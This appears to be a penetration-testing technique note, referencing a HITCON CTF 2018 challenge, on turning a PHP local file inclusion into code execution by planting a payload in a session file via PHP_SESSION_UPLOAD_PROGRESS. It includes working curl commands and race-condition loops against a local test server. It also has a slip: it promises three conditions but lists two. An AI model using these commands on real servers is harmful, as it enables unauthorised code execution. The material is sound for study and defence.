# PHP LFI to RCE via `PHP_SESSION_UPLOAD_PROGRESS`

---

## Background

PHP checks the value of the [session.auto_start](https://www.php.net/manual/en/session.configuration.php#ini.session.auto-start) configuration variable to know whether it needs to keep track of session data. The default value of `session.auto_start` is `Off`.

When `session.auto_start` is `On`, the current session is stored in a file named `sess_$PHPSESSID` in the directory specified in [session.save_path](https://www.php.net/manual/en/session.configuration.php#ini.session.save-path) as a serialized PHP object. If `session.save_path` is an empty string, the current session will be stored in `/tmp`.

If you send a multipart `POST` request to any PHP endpoint with the `PHPSESSID` cookie set to an arbitrary value, a part named `PHP_SESSION_UPLOAD_PROGRESS`, and an arbitrary file, PHP will enable a session *automatically*. The value you specified for the `PHP_SESSION_UPLOAD_PROGRESS` part will be written into the serialized session object saved in `sess_$PHPSESSID` at `session.save_path`. You control `PHP_SESSID` as well.

```bash
$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange'
$ ls -a /var/lib/php/sessions/
. ..
$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -d 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'
$ ls -a /var/lib/php/sessions/
. ..
$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'  -F 'file=@/etc/passwd'
$ ls -a /var/lib/php/sessions/
. .. sess_iamorange
```

When [session.upload_progress.cleanup](https://www.php.net/manual/en/session.configuration.php#ini.session.upload-progress.cleanup) is `On`, the session file is emptied after processing the above request, removing the `PHP_SESSION_UPLOAD_PROGRESS` value from the file system. When `session.upload_progress.cleanup` is `Off`, the session file isn't emptied after the request and the `PHP_SESSION_UPLOAD_PROGRESS` value persists on the file system.

---

## Strategy

If the following three conditions are true, you can likely have an RCE vulnerability on your hands:

- `session.auto_start` is `On`
- There exists an LFI capable of "including" a file in `session.save_path`

How you go about exploiting this LFI vulnerability depends on the value of `session.upload_progress.cleanup`.

### Upload progress is not Cleaned Up

If `session.upload_progress.cleanup` is set to `Off`, simply send a multipart `POST` request to any PHP endpoint with the `PHPSESSID` cookie set to an arbitrary value, a part named `PHP_SESSION_UPLOAD_PROGRESS` set to the payload, and an arbitrary file. The payload will be written to `session.save_path/sess_$PHPSESSID`. Exploit the LFI vulnerability to "include" this file and execute the payload.

```bash
$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php echo "Hello, World!"; ?>'  -F 'file=@/home/tgihf/anything.txt' # write the payload
$ curl http://127.0.0.1/include?f=/tmp/sess_iamorange # execute the payload
```

### Upload Progress is Cleaned Up

If `session.upload_progress.cleanup` is set to `On`, the process is similar to the above, but you'll have to win the race condition in which the payload is still on the file system and the LFI vulnerability is exploited, executing the payload.

- In one thread, repeatedly send a multipart `POST` request to any PHP endpoint with the `PHPSESSID` cookie set to an arbitrary value, a part named `PHP_SESSION_UPLOAD_PROGRESS` set to the payload, and an arbitrary file. The payload will be written to `session.save_path/sess_$PHPSESSID` and then the file will be cleared once the request is finished processing

```bash
$ while true; do sleep 0.1; curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php echo "Hello, World!"; ?>'  -F 'file=@/home/tgihf/anything.txt'; done # repeatedly write the payload
```

- In another thread, continually exploit the LFI vulnerability to "include" the file at `/session.save_path/sess_$PHPSESSID`

```bash
$ while true; do sleep 0.1; curl http://127.0.0.1/include?f=/tmp/sess_iamorange; done # repeatedly attempt to execute the payload
```

---

## References

[Orange - HITCON CTF 2018 - One Line PHP Challenge](https://blog.orange.tw/2018/10/)
